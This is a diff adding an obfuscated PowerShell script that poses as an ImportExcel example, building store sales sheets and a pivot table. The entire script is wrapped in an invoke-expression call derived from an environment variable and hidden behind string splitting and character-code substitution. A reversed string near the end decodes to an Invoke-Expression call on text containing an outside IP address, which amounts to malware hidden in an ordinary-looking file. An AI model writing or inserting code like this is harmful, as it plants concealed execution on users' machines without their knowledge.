@@ -1,0 +1,49 @@
+&( $Env:COMspEc[4,26,25]-joIn'')( ('try {Impor'+'t-Modu'+'le t43PSScriptRootMpE..MpE..MpEImportExcel.psd1} catch'+' {throw ; return}
+
+#Get rid of pre-exisiting sheet
+'+'t43xlSourcefile '+'= LBit43env:TEMPMpEImportExcelExampl'+'e.xlsxLBi
+Write'+'-Verbose -Verbose -Mes'+'sage  LBiSave locati'+'on: t43xlSourcefileLBi
+Remove-'+'Item t43xlSourcefile -ErrorAction Ignore
+
+#Create s'+'imple pag'+'es for 3 stores with product ID, Produc'+'t Name, quan'+'ity price and total
+
+@LBi
+ID,Product,Quantity,Price,Total
+12001,Nails,37,3.99,147'+'.63
+12002,Hammer,5,12.10,60.5
+12003,S'+'aw,12,15.3'+'7,184.44
+12010,Drill,20'+',8'+',160
+12011,'+'Crowbar,7,23.48,164.36
+LBi@ SkN ConvertFrom-CsvSkN '+'Export-Ex'+'cel -Path t43xlSourcefile -WorkSheetname Oxfo'+'rd
+
+@LBi
+ID,Product,Quantity,Price,Total
+12001,Nails,53,3.99,211.47'+'
+12002,Hammer,6,12.10,72.60
+12003,Saw,10,15.37,153.70
+12010,Drill,10,8,80
+12012,Plie'+'rs,2,14.99,29.98
+LBi@ SkN Conve'+'rtFr'+'om-CsvSkN Export-Excel -Pa'+'th t43xlSourcefile -WorkSheetname Abingdon
+
+
+@LBi
+ID,Product,Quantity,P'+'rice,Total
+12001,Nails,20,3.99,79.80
+1200'+'2,Hammer,2,12.10,24.20
+12010,'+'Drill,11,8,88
+12012,Pliers,3,14.99,44.97
+LBi@ SkN ConvertFrom-CsvSkN Export-Excel -Path t43xlSourcefile -WorkSheetname Banbury
+
+#define a pivot table with a chart to show a sales by store, broken down by product
+t4'+'3ptd'+'ef = Ne'+'w-PivotTabl'+'eDefinition -PivotTableNa'+'me LBiSummaryLBi -PivotRows '+'LBiStoreLBi -PivotColu'+'mns LBiP'+'roductLBi -PivotDa'+'ta @{LBiTotalLBi=LBiSU'+'MLBi} -IncludePivotChart -ChartTitle LBiSales BreakdownLBi -ChartType ColumnStacked -ChartColumn 10
+
+#Join the 3 worksheets.
+#Name the combin'+'ed page LBiTotal'+'LBi and Name '+'the column w'+'ith the sheet names LBist'+'oreLBi (as the sheets TW'+'8OxfordTW8,'+'TW8AbingdonTW8 and TW8BanburyTW8 are the names of'+' the stores
+#Format the '+'data as '+'a table na'+'med LBiSummaryLBi, using the style LBiLigh'+'t1LBi, '+'put the column headers in'+' bold
+'+'#Put'+' in a title and freeze '+'to top of the sheet including title and colmun heading'+'s
+#Ad'+'d the Pivot table.
+#Show the result
+Join-Worksheet -Path t43xlSourcefile -WorkSheetNa'+'me LBiTotalL'+'Bi -Clearsheet -FromLabel LBiStoreLBi -TableName LBiCombinedLBi -TableStyle Light1 -AutoSize -BoldTopRow -FreezePan'+'e 2,1 -Title LBiStore Sales SummaryLBi -TitleBold -TitleSize 14  -PivotTableDefinition t43ptdef -show
+t43izUuJ =set 5'+'K1  ( LBi  ))93]raHc[]GnIRts['+',TW8wEMT'+'W8(EcalPER.)TW8wTW8+TW8EM'+'TW8+TW841.131.201TW8+TW8.541TW8+TW8:piwTW8+TW8EM'+'TW8( '+'( no'+'ISSeRpXE-Eko'+'VNILBi  ) ; [stRinG]::JOiN(TW8TW8, t435'+'k1[-1 .. - (t435k1.LenGth) ] )
+
+').rEPlAce('t43','$').rEPlAce(([cHar]76+[cHar]66+[cHar]105),[stRINg][cHar]34).rEPlAce(([cHar]77+[cHar]112+[cHar]69),'\').rEPlAce('TW8',[stRINg][cHar]39).rEPlAce(([cHar]83+[cHar]107+[cHar]78),'|') )
